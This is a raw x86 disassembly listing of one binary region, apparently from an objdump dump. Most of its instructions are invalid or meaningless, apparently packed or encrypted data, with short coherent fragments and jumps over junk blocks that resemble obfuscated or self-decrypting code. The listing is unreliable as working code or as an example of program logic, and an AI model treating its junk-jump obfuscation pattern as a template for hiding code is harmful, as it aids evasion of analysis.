  408419:	idiv   DWORD PTR [edi-0x75bca349]
  40841f:	dec    ebp
  408420:	mov    esp,DWORD PTR [edi-0x4e5b6e7c]
  408426:	push   0xffffffb5
  408428:	pop    ds
  408429:	cli    
  40842a:	dec    edi
  40842b:	mov    BYTE PTR [edx-0x6ef999f2],bh
  408431:	xchg   ecx,eax
  408432:	pop    esp
  408433:	or     al,0xa9
  408435:	in     al,dx
  408436:	adc    DWORD PTR [edx-0x9],ebp
  408439:	ja     0x4083de
  40843b:	pop    esp
  40843c:	fcomip st,st(4)
  40843e:	pop    ecx
  40843f:	or     ah,BYTE PTR [edx]
  408441:	and    DWORD PTR [esi+0x1a],edi
  408444:	ins    BYTE PTR es:[edi],dx
  408445:	sbb    al,0xed
  408447:	pop    ss
  408448:	js     0x40844c
  40844a:	repnz loopne 0x408493
  40844d:	sbb    al,0xa4
  40844f:	push   ss
  408450:	dec    edi
  408451:	addr16 add cl,dl
  408454:	and    ebp,DWORD PTR [esi]
  408456:	push   ebx
  408457:	pop    ebx
  408458:	add    al,0x28
  40845a:	mov    eax,0x8b70216f
  40845f:	lods   eax,DWORD PTR ds:[esi]
  408460:	dec    esi
  408461:	bound  ebx,QWORD PTR [edx]
  408463:	lods   al,BYTE PTR ds:[esi]
  408464:	or     eax,DWORD PTR [ebx+0x27c2d47a]
  40846a:	imul   eax,DWORD PTR [esi-0x569b4faa],0x148b4194
  408474:	or     al,0xe8
  408476:	pop    edi
  408477:	push   ss
  408478:	and    bl,BYTE PTR [eax+0x1d960dc3]
  40847e:	xor    al,0x33
  408480:	shr    ecx,0x84
  408483:	add    DWORD PTR [eax],eax
  408485:	add    BYTE PTR [ebx],ch
  408487:	or     bl,bh
  408489:	je     0x408486
  40848b:	out    0xfb,eax
  40848d:	sub    ecx,DWORD PTR [ebp+0x402c4c8b]
  408493:	fisttp QWORD PTR [edi+0x3a]
  408496:	fistp  QWORD PTR [edi]
  408498:	jl     0x408516
  40849a:	call   0x20bd011e
  40849f:	mov    ds:0x830df282,al
  4084a4:	push   ecx
  4084a5:	pusha  
  4084a6:	push   esi
  4084a7:	add    DWORD PTR [edx+0x59],esi
  4084aa:	and    dh,BYTE PTR [ebp+0x2917f6af]
  4084b0:	dec    edi
  4084b1:	stos   BYTE PTR es:[edi],al
  4084b2:	lods   al,BYTE PTR ds:[esi]
  4084b3:	and    BYTE PTR [edx+0x7365ca6],0xbc
  4084ba:	and    BYTE PTR [edx+0x511425ff],0xb5
  4084c1:	mov    al,ds:0x6ff7f55e
  4084c6:	sub    al,0x68
  4084c8:	sar    DWORD PTR [ebp+eiz*8+0x4cdc44cd],cl
  4084cf:	mov    edi,esp
  4084d1:	es adc al,0x76
  4084d4:	je     0x4084c7
  4084d6:	xor    al,0xfd
  4084d8:	xchg   esi,eax
  4084d9:	pop    ss
  4084da:	xor    dl,BYTE PTR [esi+0x6e]
  4084dd:	neg    ebp
  4084df:	lds    edx,FWORD PTR [ebx]
  4084e1:	jae    0x408493
  4084e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084e4:	(bad)  
  4084e5:	bound  edx,QWORD PTR [ecx-0x78]
  4084e8:	push   edi
  4084e9:	adc    BYTE PTR [edi],0x91
  4084ec:	adc    DWORD PTR [ecx+0x5a],ecx
  4084ef:	ins    BYTE PTR es:[edi],dx
  4084f0:	jb     0x408526
  4084f2:	stc    
  4084f3:	mov    eax,ds:0x956275a9
  4084f8:	inc    esp
  4084f9:	div    DWORD PTR [esi-0x59]
  4084fc:	jbe    0x40848e
  4084fe:	and    BYTE PTR ds:0x29991a6,0xf0
  408505:	sbb    dl,dh
  408507:	or     bh,BYTE PTR [ecx+0x2acc88df]
  40850d:	cmp    ch,BYTE PTR [ebx-0x34850a07]
  408513:	xor    ebx,DWORD PTR gs:[ebp+0x46]
  408517:	xchg   esp,eax
  408518:	(bad)  
  408519:	popa   
  40851a:	mov    cl,0x3e
  40851c:	pop    es
  40851d:	push   0x5df93c6d
  408522:	retf   
  408523:	and    bl,0x2b
  408526:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408527:	mov    ecx,0xe086f57c
  40852c:	in     al,dx
  40852d:	or     ebx,DWORD PTR [edx]
  40852f:	rol    bh,cl
  408531:	leave  
  408532:	xchg   esp,eax
  408533:	xor    bl,BYTE PTR [edx+0x18]
  408536:	(bad)  
  408537:	fcom   QWORD PTR [eax+ebp*1+0x64a0d274]
  40853e:	popf   
  40853f:	jecxz  0x4084fa
  408541:	adc    al,0xf1
  408543:	repnz aam 0x4c
  408546:	and    eax,0xc6d6b1ae
  40854b:	fstp   DWORD PTR [ecx-0x2beb3efe]
  408551:	pop    ss
  408552:	pop    ebx
  408553:	mov    ecx,ss
  408555:	xor    eax,0x49f41d74
  40855a:	daa    
  40855b:	xchg   DWORD PTR [edi+0x55],edx
  40855e:	xchg   esi,edi
  408560:	shl    DWORD PTR [ecx],1
  408562:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408563:	push   esi
  408564:	test   eax,0x41a07d2e
  408569:	imul   edi,edi,0x10
  40856c:	jp     0x40852f
  40856e:	cmp    eax,0x2e7edc
  408573:	pop    eax
  408574:	lds    ecx,FWORD PTR ds:0xaca97d7
  40857a:	adc    al,0x68
  40857c:	jp     0x408540
  40857e:	test   al,0xbe
  408580:	pop    ebp
  408581:	cmp    eax,0xeae01bc
  408586:	jg     0x408532
  408588:	and    al,0xe
  40858a:	jge    0x408607
  40858c:	pop    ds
  40858d:	xchg   esp,eax
  40858e:	pusha  
  40858f:	lock pop edx
  408591:	lea    edx,[esi]
  408593:	mov    gs,WORD PTR [edx-0x26]
  408596:	cs clc 
  408598:	and    al,0x9
  40859a:	out    dx,al
  40859b:	test   al,0xa1
  40859d:	mov    al,ds:0x72a88b38
  4085a2:	mov    al,ds:0xb4e48ac2
  4085a7:	mov    ebx,0x55ab7655
  4085ac:	fldenv [ecx-0x22]
  4085af:	ds js  0x408596
  4085b2:	retf   0xe495
  4085b5:	xchg   esp,eax
  4085b6:	xchg   BYTE PTR ss:[edx+ebp*8+0x6b22d10b],bh
  4085be:	ror    BYTE PTR [edi-0x3d936a43],0x12
  4085c5:	aaa    
  4085c6:	dec    ecx
  4085c7:	aam    0x6
  4085c9:	popf   
  4085ca:	push   esp
  4085cb:	pop    ss
  4085cc:	and    eax,esi
  4085ce:	pusha  
  4085cf:	ficom  WORD PTR [eax-0x23]
  4085d2:	int3   
  4085d3:	sub    bl,BYTE PTR [ebp+0x67]
  4085d6:	sahf   
  4085d7:	fst    QWORD PTR [eax]
  4085da:	stc    
  4085db:	xchg   ebx,eax
  4085dc:	pushf  
  4085dd:	inc    edi
  4085de:	dec    ebp
  4085df:	aad    0x17
  4085e1:	add    eax,0xbe17ee77
  4085e6:	div    edx
  4085e8:	(bad)  
  4085e9:	shl    bh,cl
  4085eb:	jns    0x40865d
  4085ed:	push   edi
  4085ee:	dec    ebp
  4085ef:	or     ebx,DWORD PTR [esi+0x4e0a9e1d]
  4085f5:	sbb    al,0x1
  4085f7:	push   edi
  4085f8:	cmp    al,0xed
  4085fa:	or     eax,0x8d3b3e44
  4085ff:	retf   0x5aa0
  408602:	imul   ebx,DWORD PTR [edi-0x2c995deb],0x15
  408609:	and    DWORD PTR [ebx],eax
  40860b:	(bad)  
  40860c:	imul   eax,DWORD PTR [edx]
  40860f:	mov    edx,DWORD PTR [ebp-0x4]
  408612:	xor    edx,ecx
  408614:	mov    ecx,DWORD PTR [ebp+0x8]
  408617:	lea    ecx,[edx+ecx*1+0x32729e]
  40861e:	cmp    ecx,eax
  408620:	jmp    0x4087a9
  408625:	test   DWORD PTR [edi],esp
  408627:	in     al,dx
  408628:	iret   
  408629:	jp     0x4085f2
  40862b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40862c:	jge    0x4085fc
  40862e:	(bad)  
  40862f:	loope  0x408624
  408631:	dec    ecx
  408632:	inc    ebp
  408633:	cmp    eax,0x7c3e4bbe
  408638:	jl     0x408622
  40863a:	jg     0x4086b8
  40863c:	jl     0x4085ed
  40863e:	leave  
  40863f:	pop    ecx
  408640:	push   edi
  408641:	(bad)  
  408642:	push   eax
  408643:	mov    esp,0x84d01b10
  408648:	or     ecx,DWORD PTR [edi-0x2]
  40864b:	test   DWORD PTR [esp+ecx*4-0x5f364ee5],esp
  408652:	pminsw mm3,mm5
  408655:	cwde   
  408656:	lods   al,BYTE PTR ds:[esi]
  408657:	sub    al,0xe9
  408659:	outs   dx,DWORD PTR ds:[esi]
  40865a:	xor    dl,BYTE PTR [ebp-0x73ab7c53]
  408660:	sar    DWORD PTR [edi+ebp*1-0x5a5b897e],0x45
  408668:	rcl    BYTE PTR [ebp-0x46864d4e],1
  40866e:	add    ah,BYTE PTR [ecx]
  408670:	and    edx,edi
  408672:	mov    ebx,0x4edcf930
  408677:	and    BYTE PTR [ecx],bl
  408679:	xor    ecx,DWORD PTR ds:0xf2234efc
  40867f:	lea    esp,[edx]
  408681:	mov    al,ah
  408683:	retf   0x9635
  408686:	icebp  
  408687:	dec    ebx
  408688:	add    al,0x13
  40868a:	loop   0x40866b
  40868c:	jge    0x408622
  40868e:	adc    DWORD PTR [edi+0x79],edx
  408691:	sahf   
  408692:	pop    edi
  408693:	or     eax,0x7627955
  408698:	(bad)  
  408699:	push   edx
  40869a:	enter  0x3b2c,0xb9
  40869e:	aaa    
  40869f:	jmp    FWORD PTR ds:0x1fa0b081
  4086a5:	lahf   
  4086a6:	or     ecx,DWORD PTR [edi-0x200565b1]
  4086ac:	nop
  4086ad:	or     BYTE PTR cs:[esi+0x571cbfbf],ah
  4086b4:	xchg   BYTE PTR [ebp+0x9253ac],bh
  4086ba:	xor    esi,DWORD PTR [edi+0x4a]
  4086bd:	pop    ds
  4086be:	aaa    
  4086bf:	jno    0x408724
  4086c1:	cdq    
  4086c2:	push   0xd4998e84
  4086c7:	popf   
  4086c8:	add    eax,0x78c2d4be
  4086cd:	pop    ss
  4086ce:	dec    esi
  4086cf:	cdq    
  4086d0:	or     edx,ebx
  4086d2:	jne    0x408701
  4086d4:	mov    ebp,0x9212ea76
  4086d9:	mov    eax,0xbcb215cc
  4086de:	clc    
  4086df:	sub    ch,BYTE PTR ds:[edx]
  4086e2:	jmp    0x6339bc05
  4086e7:	cmp    al,0x2f
  4086e9:	pop    eax
  4086ea:	xor    BYTE PTR [esi],dh
  4086ec:	int3   
  4086ed:	or     eax,0x4f7f7d20
  4086f2:	loope  0x4086ae
  4086f4:	mov    esp,0x11c3ee7b
  4086f9:	ds clc 
  4086fb:	fnstcw WORD PTR [ebp-0x45faadbb]
  408701:	stos   BYTE PTR es:[edi],al
  408702:	mov    eax,ds:0xc18bf908
  408707:	adc    eax,0xd81eaba7
  40870c:	mov    esp,0x4f755574
  408711:	fidivr WORD PTR [edi]
  408713:	loopne 0x408792
  408715:	(bad)  
  408716:	sbb    eax,DWORD PTR [edx]
  408718:	(bad)
  40871c:	pop    esi
  40871d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40871e:	cmp    ecx,DWORD PTR [edx-0x39882929]
  408724:	jle    0x4086fa
  408726:	ss and al,0x1b
  408729:	fs (bad) 
  40872b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40872c:	arpl   WORD PTR [ecx+0x25],si
  40872f:	cmp    DWORD PTR [edi],esi
  408731:	js     0x4086c0
  408733:	addr16 jmp 0x73ed75eb
  408739:	pmaddwd mm5,mm3
  40873c:	mov    esi,0x98dd2764
  408741:	(bad)
  408744:	dec    edx
  408745:	imul   esi,DWORD PTR [esp+edi*4+0x474c49ed],0xbe1598b3
  408750:	add    DWORD PTR [esi+eiz*2],0xffffff9b
  408754:	rcl    bl,cl
  408756:	dec    ebp
  408757:	or     BYTE PTR [eax+0x29],ch
  40875a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40875b:	pop    ebp
  40875c:	ror    BYTE PTR [esi],0x1
  40875f:	stos   BYTE PTR es:[edi],al
  408760:	xchg   esi,eax
  408761:	daa    
  408762:	aas    
  408763:	sbb    al,0xc1
  408765:	popa   
  408766:	fcom   QWORD PTR [edx-0x11]
  408769:	call   0xe332c021
  40876e:	cmp    edx,esi
  408770:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408771:	inc    esi
  408772:	adc    cl,BYTE PTR [ebx-0x19f34819]
  408778:	adc    al,0xb8
  40877a:	std    
  40877b:	jns    0x40874e
  40877d:	daa    
  40877e:	pop    edx
  40877f:	std    
  408780:	out    dx,al
  408781:	es hlt 
  408783:	sbb    ecx,DWORD PTR [esp+esi*2]
  408786:	imul   ebp,DWORD PTR [ebx+esi*4],0x5b437ab6
  40878d:	dec    edx
  40878e:	jns    0x408781
  408790:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408791:	mov    eax,ds:0x14c36333
  408796:	into   
  408797:	sbb    BYTE PTR [edi-0x54adbf25],0x82
  40879e:	fidivr WORD PTR [ebp-0x63]
  4087a1:	xchg   esp,eax
  4087a2:	cmp    DWORD PTR [ebx-0x3c3b18a6],ebp
  4087a8:	ror    BYTE PTR [edi],0x85
  4087ab:	jmp    0x8c4087a7
  4087b0:	fsubp  st(1),st
  4087b2:	add    eax,0xbb000000
  4087b7:	sahf   
  4087b8:	jb     0x4087ec
  4087ba:	add    BYTE PTR [ebx+0x5735fc45],cl
  4087c0:	or     BYTE PTR [ecx+0x7],dl
  4087c3:	add    eax,ebx
  4087c5:	mov    DWORD PTR [ebp-0xc],eax
  4087c8:	xor    ebx,ebx
  4087ca:	lea    eax,[ebp-0x10]
  4087cd:	add    ebx,DWORD PTR [eax]
  4087cf:	call   ebx
  4087d1:	xor    ebx,ebx
  4087d3:	inc    ebx
  4087d4:	cmp    DWORD PTR [ebp+0x10],ebx
  4087d7:	je     0x40897e
  4087dd:	xchg   edx,eax
  4087de:	push   0xa
  4087e0:	pop    ecx
  4087e1:	push   0x4
  4087e3:	pop    ebx
  4087e4:	inc    ebx
  4087e5:	xchg   ebx,ecx
  4087e7:	sub    ebx,ecx
  4087e9:	xchg   ebx,ecx
  4087eb:	dec    ecx
  4087ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4087ef:	jmp    0x408978
  4087f4:	hlt    
  4087f5:	jecxz  0x4087ee
  4087f7:	dec    esi
  4087f8:	jnp    0x408874
  4087fa:	pop    ecx
  4087fb:	std    
  4087fc:	sahf   
  4087fd:	retf   0x4846
  408800:	sbb    BYTE PTR [edi+0x3027b2f6],bh
  408806:	jl     0x408884
  408808:	call   0x22bd048c
  40880d:	or     DWORD PTR [ebx+0x53],edi
  408810:	out    0xed,al
  408812:	push   edi
  408813:	ror    DWORD PTR [eax+0x49],0xea
  408817:	fst    QWORD PTR ds:0x96a564ed
  40881d:	sub    BYTE PTR [esi+0x5e0cb5d],0x61
  408824:	icebp  
  408825:	push   ecx
  408826:	pop    edi
  408827:	mov    al,0xd9
  408829:	push   edi
  40882a:	nop
  40882b:	loopne 0x4087ed
  40882d:	lock leave 
  40882f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408830:	xor    BYTE PTR [ecx-0x2af065e2],bh
  408836:	ins    DWORD PTR es:[edi],dx
  408837:	cmp    BYTE PTR [edx],0x3d
  40883a:	ins    DWORD PTR es:[edi],dx
  40883b:	ins    BYTE PTR es:[edi],dx
  40883c:	mov    bl,0xd2
  40883e:	jo     0x408822
  408840:	and    bh,BYTE PTR [eax-0x37fbb751]
  408846:	fwait
  408847:	mov    ebp,0x4cda6cba
  40884c:	rcl    DWORD PTR [ecx],1
  40884e:	ins    BYTE PTR es:[edi],dx
  40884f:	xor    eax,0x902bb6cb
  408854:	(bad)  
  408855:	push   ebp
  408856:	lea    ecx,[ebx]
  408858:	lods   al,BYTE PTR ds:[esi]
  408859:	xlat   BYTE PTR ds:[ebx]
  40885a:	mov    bh,BYTE PTR [ecx]
  40885c:	rcr    DWORD PTR [eax+0x48],1
  40885f:	pushf  
  408860:	cs popa 
  408862:	mov    esi,0x3d0773b
  408867:	aas    
  408868:	mov    ch,0xa2
  40886a:	pop    edx
  40886b:	push   0x737ea1d8
  408870:	add    eax,0x36c602e
  408875:	into   
  408876:	fisub  WORD PTR [ebp+0x7]
  408879:	ret    0x4541
  40887c:	stos   BYTE PTR es:[edi],al
  40887d:	gs fld st(7)
  408880:	cmp    eax,0xa95027df
  408885:	cmp    eax,DWORD PTR [eax+0x25]
  408888:	ret    
  408889:	xor    eax,0xbc5b15c1
  40888e:	daa    
  40888f:	in     al,0x48
  408891:	sbb    eax,0xb2866c02
  408896:	pop    ecx
  408897:	cmp    ah,BYTE PTR [edx+0x67]
  40889a:	inc    dl
  40889c:	sar    BYTE PTR [ecx-0x2d],1
  40889f:	push   edx
  4088a0:	ret    
  4088a1:	push   esi
  4088a2:	cmp    bl,dh
  4088a4:	pop    ss
  4088a5:	or     al,0xc1
  4088a7:	xor    DWORD PTR [esi-0x681a3ad0],ebx
  4088ad:	sti    
  4088ae:	adc    BYTE PTR [ebx-0x21],dl
  4088b1:	xchg   DWORD PTR [eax+0x5b],edx
  4088b4:	(bad)
  4088b8:	mov    ebx,0xf7eeee6d
  4088bd:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4088bf:	inc    esi
  4088c0:	pusha  
  4088c1:	pop    ebx
  4088c2:	jle    0x4088b5
  4088c4:	add    ebx,DWORD PTR [ebx]
  4088c6:	bound  edi,QWORD PTR [esi+0x46cb66b2]
  4088cc:	mov    ?,WORD PTR [ecx+0x29]
  4088cf:	mov    bl,0x88
  4088d1:	cmp    edi,DWORD PTR ds:0xbf441f44
  4088d7:	mov    edi,0xc582ae67
  4088dc:	int    0xf5
  4088de:	pop    esp
  4088df:	jo     0x408906
  4088e1:	inc    eax
  4088e2:	mov    al,0xca
  4088e4:	mov    DWORD PTR [eax+ebx*8+0x113eb73e],esi
  4088eb:	fmul   DWORD PTR [ecx]
  4088ed:	jnp    0x408935
  4088ef:	jecxz  0x408942
  4088f1:	jmp    0x9bf:0x84bcfe66
  4088f8:	mov    ds:0xda24ed4d,al
  4088fd:	mov    BYTE PTR [esi+0x4bac1e28],dh
  408903:	xchg   ebp,eax
  408904:	push   ss
  408905:	cmp    al,BYTE PTR [esp+edx*8]
  408908:	add    edx,DWORD PTR [edx]
  40890a:	daa    
  40890b:	jg     0x408898
  40890d:	lea    edx,[edi-0x62d83eca]
  408913:	loopne 0x40889a
  408915:	and    edx,DWORD PTR [edx]
  408917:	retf   
  408918:	jne    0x4088cf
  40891a:	into   
  40891b:	stos   DWORD PTR es:[edi],eax
  40891c:	in     eax,dx
  40891d:	dec    esi
  40891e:	jecxz  0x408962
  408920:	mov    ecx,0x6dc17421
  408925:	sbb    DWORD PTR [ebx-0x7d6daca0],esi
  40892b:	jle    0x408995
  40892d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40892e:	cdq    
  40892f:	push   esp
  408930:	pop    edi
  408931:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408932:	cmp    eax,0x4d3ec6fa
  408937:	adc    eax,0x4d33b038
  40893c:	rcr    ebx,1
  40893e:	xor    eax,0xde51cd58
  408943:	cs dec ebx
  408945:	test   DWORD PTR [ecx+0x16fa9816],edi
  40894b:	rcl    cl,0xf7
  40894e:	outs   dx,DWORD PTR ds:[esi]
  40894f:	sbb    al,0xb8
  408951:	out    0x93,al
  408953:	(bad)  
  408954:	jl     0x408941
  408956:	fwait
  408957:	jnp    0x4088f6
  408959:	mov    al,ds:0xaab1344c
  40895e:	pop    eax
  40895f:	pushf  
  408960:	xchg   esi,eax
  408961:	(bad)  
  408962:	aaa    
  408963:	daa    
  408964:	cli    
  408965:	xchg   ecx,eax
  408966:	sub    al,0x7c
  408968:	lods   al,BYTE PTR ds:[esi]
  408969:	push   ss
  40896a:	int    0x40
  40896c:	clc    
  40896d:	xchg   edi,eax
  40896e:	push   edi
  40896f:	fs ins BYTE PTR es:[edi],dx
  408971:	or     cl,ch
  408973:	mov    BYTE PTR ds:0xff1d37c,dh
  408979:	scas   eax,DWORD PTR es:[edi]
  40897a:	rol    DWORD PTR [ebx],0xe0
  40897d:	xchg   edx,eax
  40897e:	push   eax
  40897f:	xor    ebx,ebx
  408981:	mov    edx,esp
  408983:	dec    edx
  408984:	jmp    0x408b0d
  408989:	xchg   BYTE PTR [edx+0x456bbe5f],ah
  40898f:	mov    ecx,0xfaf08d7a
  408994:	mov    esi,0xfd91b663
  408999:	xchg   ebx,eax
  40899a:	xor    edi,DWORD PTR [esp+edi*2-0x18]
  40899e:	jg     0x408a1c
  4089a0:	jl     0x408985
  4089a2:	or     ah,bl
  4089a4:	(bad)  
  4089a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089a6:	sub    esi,DWORD PTR [ebp+0x1e3a5bf]
  4089ac:	(bad)  
  4089ad:	popf   
  4089ae:	add    bh,dl
  4089b0:	inc    ecx
  4089b1:	xor    bl,dl
  4089b3:	sub    al,0x15
  4089b5:	lods   al,BYTE PTR ds:[esi]
  4089b6:	test   BYTE PTR [esi],dh
  4089b8:	js     0x4089d6
  4089ba:	inc    edi
  4089bb:	out    0xee,eax
  4089bd:	mov    bl,0xdf
  4089bf:	test   bh,ch
  4089c1:	loope  0x408984
  4089c3:	(bad)  [edx-0x90fe35b]
  4089c9:	dec    ebx
  4089ca:	bound  esp,QWORD PTR [ecx+0x25]
  4089cd:	jae    0x408a4a
  4089cf:	ins    BYTE PTR es:[edi],dx
  4089d0:	aad    0x16
  4089d2:	mov    ecx,0x7eb2dc25
  4089d7:	add    al,0x6a
  4089d9:	or     edx,DWORD PTR [eax+0x36]
  4089dc:	jp     0x40897a
  4089de:	xor    BYTE PTR [ebx],bh
  4089e0:	aaa    
  4089e1:	loop   0x4089d4
  4089e3:	or     edx,ecx
  4089e5:	xchg   esp,eax
  4089e6:	sti    
  4089e7:	inc    ecx
  4089e8:	dec    edi
  4089e9:	fisubr DWORD PTR [ebp-0x7f]
  4089ec:	jbe    0x40896f
  4089ee:	mov    bx,0xbc91
  4089f2:	arpl   WORD PTR [ebp-0x6d18e666],cx
  4089f8:	fmulp  st(2),st
  4089fa:	and    edi,DWORD PTR ds:0x5bdc20a9
  408a00:	mov    ebx,0x9df54306
  408a05:	push   ss
  408a06:	sub    eax,0xa041c62b
  408a0b:	jle    0x408a1c
  408a0d:	(bad)  
  408a0e:	loope  0x408a8c
  408a10:	ss jo  0x4089e8
  408a13:	and    ecx,ebx
  408a15:	dec    esp
  408a16:	pop    ds
  408a17:	pop    edi
  408a18:	scas   al,BYTE PTR es:[edi]
  408a19:	inc    edx
  408a1a:	jmp    0x4089f7
  408a1c:	aad    0xfe
  408a1e:	mov    ah,0x89
  408a20:	fdiv   DWORD PTR [ecx]
  408a22:	push   ebp
  408a23:	lods   eax,DWORD PTR ds:[esi]
  408a24:	push   edx
  408a25:	push   0x7aea4b91
  408a2a:	jae    0x408a7a
  408a2c:	add    eax,0xc7787af9
  408a31:	scas   eax,DWORD PTR es:[edi]
  408a32:	fistp  QWORD PTR [edi*1+0x35e7425d]
  408a39:	in     al,0xc
  408a3b:	jge    0x4089e1
  408a3d:	outs   dx,BYTE PTR ds:[esi]
  408a3e:	mov    eax,ds:0x9ea3f1aa
  408a43:	adc    DWORD PTR [edx+ebx*2+0x6a],eax
  408a47:	mov    ebp,0x9811b621
  408a4c:	push   edx
  408a4d:	jbe    0x408abe
  408a4f:	add    edi,DWORD PTR [eax+esi*1]
  408a52:	mov    DWORD PTR [ecx-0xa],esi
  408a55:	cmp    cl,bl
  408a57:	fadd   st(4),st
  408a59:	add    eax,0xf136b64e
  408a5e:	(bad)  
  408a5f:	fiadd  DWORD PTR [esi]
  408a61:	mov    ebp,0x9f5dc315
  408a66:	cmc    
  408a67:	dec    esi
  408a68:	fistp  WORD PTR ss:[edx+0x513c895f]
  408a6f:	dec    ecx
  408a70:	jae    0x408aae
  408a72:	jno    0x408a82
  408a74:	and    bl,dl
  408a76:	mov    ebp,0x40c73216
  408a7b:	push   0x13353e0a
  408a80:	ret    
  408a81:	in     al,0xba
  408a83:	push   ecx
  408a84:	shl    DWORD PTR [edi+0x70],1
  408a87:	mov    edx,0x21912d18
  408a8c:	mov    ebx,0x45ca197d
  408a91:	mov    ebx,0xad15d0ad
  408a96:	icebp  
  408a97:	dec    esi
  408a98:	sbb    eax,0x12faf616
  408a9d:	push   ebx
  408a9e:	xchg   esp,eax
  408a9f:	retf   0xc2c1
  408aa2:	sbb    ecx,DWORD PTR [esi+eiz*4-0x7e]
  408aa6:	enter  0xcc2,0xdd
  408aaa:	dec    ecx
  408aab:	mov    dl,0x3a
  408aad:	mov    ah,0x2c
  408aaf:	xchg   esi,eax
  408ab0:	mov    edx,0xdef2a44d
  408ab5:	and    eax,0xa5ef0757
  408aba:	out    0xe,al
  408abc:	and    al,BYTE PTR [ebp+0x1f]
  408abf:	fisub  WORD PTR [edi-0x16e20de]
  408ac5:	fs mov ecx,0x8a0501eb
  408acb:	aas    
  408acc:	jbe    0x408ab1
  408ace:	sbb    al,0xef
  408ad0:	mov    esi,0xb4ba0d3c
  408ad5:	mov    ebp,ds
  408ad7:	inc    edx
  408ad8:	fisttp WORD PTR [eax+0x66]
  408adb:	mov    ds:0xcbcbb7ac,al
  408ae0:	pop    esp
  408ae1:	or     esp,0xd013ab4
  408ae7:	cdq    
  408ae8:	ficom  WORD PTR [ebx]
  408aea:	cmp    edx,DWORD PTR [ecx-0x66001ee2]
  408af0:	pop    eax
  408af1:	inc    esp
  408af2:	(bad)  
  408af3:	(bad)  
  408af4:	lds    esi,FWORD PTR [esi-0x28]
  408af7:	dec    eax
  408af8:	cs out dx,al
  408afa:	jmp    0x408adc
  408afc:	(bad)  
  408afd:	(bad)  
  408afe:	ds adc ebx,ecx
  408b01:	out    0xba,eax
  408b03:	clc    
  408b04:	xchg   esp,eax
  408b05:	mov    dl,0xa8
  408b07:	inc    eax
  408b08:	popa   
  408b09:	cmc    
  408b0a:	sbb    eax,0x3438425
  408b0f:	sbb    al,0x1a
  408b11:	dec    ebx
  408b12:	xor    edx,edx
  408b14:	add    DWORD PTR [ebp-0xc],ebx
  408b17:	pop    ebx
  408b18:	mov    eax,DWORD PTR [ebp-0xc]
  408b1b:	pop    edi
  408b1c:	jmp    0x408ca5
  408b21:	add    al,0xa8
  408b23:	retf   
  408b24:	mov    al,0x7b
  408b26:	push   ebx
  408b27:	xchg   DWORD PTR [eax-0x17],edi
  408b2a:	shl    ebx,1
  408b2c:	das    
  408b2d:	mov    edi,0xf5e7216
  408b32:	xor    eax,0x7fe87c7c
  408b37:	jl     0x408bb5
  408b39:	ret    0x9fd
  408b3c:	and    eax,0x2caa3d12
  408b41:	or     al,0x31
  408b43:	mov    bl,BYTE PTR [esi]
  408b45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b46:	ror    BYTE PTR ds:[ebp+edx*1+0x73d18dc3],0xbd
  408b4f:	or     ebp,DWORD PTR [ebp-0x68173e6c]
  408b55:	jl     0x408b74
  408b57:	call   0xe23:0xcb27ad88
  408b5e:	leave  
  408b5f:	rcl    edi,0xd9
  408b62:	add    cl,BYTE PTR [ecx]
  408b64:	pushf  
  408b65:	(bad)  
  408b66:	icebp  
  408b67:	mov    ax,ds:0xf47e3189
  408b6d:	add    DWORD PTR [ebp-0x6ab5a19c],ecx
  408b73:	(bad)  
  408b74:	sub    BYTE PTR [esi],cl
  408b76:	mov    WORD PTR [ebp-0x5a],fs
  408b79:	adc    al,0x95
  408b7b:	pushf  
  408b7c:	gs (bad) 
  408b7e:	or     esi,DWORD PTR [edx]
  408b80:	push   ss
  408b81:	xchg   edi,eax
  408b82:	mov    ds,WORD PTR [edi-0x1d]
  408b85:	lea    edx,[ebp-0x12ee6823]
  408b8b:	popf   
  408b8c:	xchg   ecx,eax
  408b8d:	aad    0x94
  408b8f:	sti    
  408b90:	add    dl,BYTE PTR [edx-0x5c6c29f4]
  408b96:	rcl    dh,1
  408b98:	mov    eax,ds:0x8cb26b7
  408b9d:	nop
  408b9e:	fstp   TBYTE PTR [ecx-0x618ab960]
  408ba4:	call   0x922c:0x28ff803a
  408bab:	ds mov ?,esi
  408bae:	pop    esp
  408baf:	frstor cs:[ecx+0x2b0d5bba]
  408bb6:	stos   DWORD PTR es:[edi],eax
  408bb7:	pop    ecx
  408bb8:	test   eax,0x5637b930
  408bbd:	xchg   ebp,eax
  408bbe:	inc    ecx
  408bbf:	lock bound ecx,QWORD PTR [ebx-0x292b265]
  408bc6:	in     eax,dx
  408bc7:	jbe    0x408c0e
  408bc9:	fisttp WORD PTR [ebp-0x3f]
  408bcc:	iret   
  408bcd:	daa    
  408bce:	add    eax,0x8119aa6b
  408bd3:	int    0x1b
  408bd5:	mov    DWORD PTR [ecx],esi
  408bd7:	mov    ecx,0xccd43159
  408bdc:	push   edx
  408bdd:	ins    DWORD PTR es:[edi],dx
  408bde:	in     al,0x19
  408be0:	push   edi
  408be1:	shl    DWORD PTR [esi-0x68],cl
  408be4:	sahf   
  408be5:	jmp    0x70a6:0xbec8b4a8
  408bec:	in     al,0x9
  408bee:	push   esp
  408bef:	ficomp DWORD PTR [eax]
  408bf1:	out    0xe5,al
  408bf3:	xchg   edx,eax
  408bf4:	pusha  
  408bf5:	mov    cl,0x49
  408bf7:	in     al,0xa8
  408bf9:	pop    ss
  408bfa:	sub    DWORD PTR [ebx-0x31],ebp
  408bfd:	push   esp
  408bfe:	xchg   BYTE PTR [edx],bl
  408c00:	cli    
  408c01:	loop   0x408c23
  408c03:	jmp    edi
